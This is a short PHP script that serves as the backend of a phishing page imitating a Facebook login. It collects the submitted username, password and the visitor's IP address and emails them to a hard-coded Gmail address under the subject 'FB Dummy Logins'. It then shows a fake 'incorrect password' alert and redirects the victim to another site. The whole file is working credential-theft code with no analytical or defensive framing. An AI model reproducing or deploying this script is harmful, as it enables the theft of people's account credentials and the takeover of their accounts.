<?php
// Get user IP address
$user_ip = $_SERVER['REMOTE_ADDR'];



//varible setting
$username = $_REQUEST['o_name'];  // fetch username
 $passcode = $_REQUEST['pass_u'];  // fetch password
 $subject = "FB Dummy Logins";
 $to ="josephbright342@gmail.com";
 
$txt = "Username: " . $username . "\r\nPassword: " . $passcode . "\r\nUser IP Address: " . $user_ip; // email body (i) username [break] (ii) password;
 


// check input fields
if (empty($username)|| empty($passcode)){ // name or message
echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
    window.history.go(-1);
    </script>";
}
else 
{ 
    mail($to,$subject,$txt); // send an email 
    echo"<script type='text/javascript'>alert('Username or Password is incorrect. Try again. ');
     // Simulate an HTTP redirect: 
    window.location.replace('https://votelive.vercel.app/');
    </script>";
}


?>